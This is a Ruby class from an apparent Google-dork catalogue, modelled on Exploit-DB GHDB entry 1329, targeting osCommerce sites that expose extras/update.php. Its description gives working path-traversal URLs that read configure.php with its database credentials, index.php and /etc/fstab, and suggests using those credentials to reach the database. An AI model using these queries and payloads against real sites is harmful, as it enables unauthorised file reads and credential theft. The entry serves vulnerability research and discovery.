module Dorks
   class Dork1329 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1329",
            ghdb_url: "https://www.exploit-db.com/ghdb/1329",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2006-04-15",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"extras/update.php" intext:mysql.php -display
EDORK
            description: <<~EDESC
this is an osCommerce dork:inurl:"extras/update.php" intext:mysql.php -display or more simply: inurl:"extras/update.php" -display (this display some more hosts where error_reporting=0) I found this simple exploit, if extras/ folder is inside the www path, you can view all files on target system, including php files and so on, ex: http://[target]/[path]/extras/update.php?read_me=0&readme_file=../catalog/includes/configure.php http://[target]/[path]/extras/update.php?read_me=0&readme_file=../index.php http://[target]/[path]/extras/update.php?read_me=0&readme_file=/etc/fstab also, if you succeed to view configure script with database details, you can connect to it trough some test scripts inside this folder...now I read this:http://www.securityfocus.com/bid/14294/infothis is actually unpatched/unresolved in 2.2 on Apr 2006
EDESC
         })

      end
   end
end
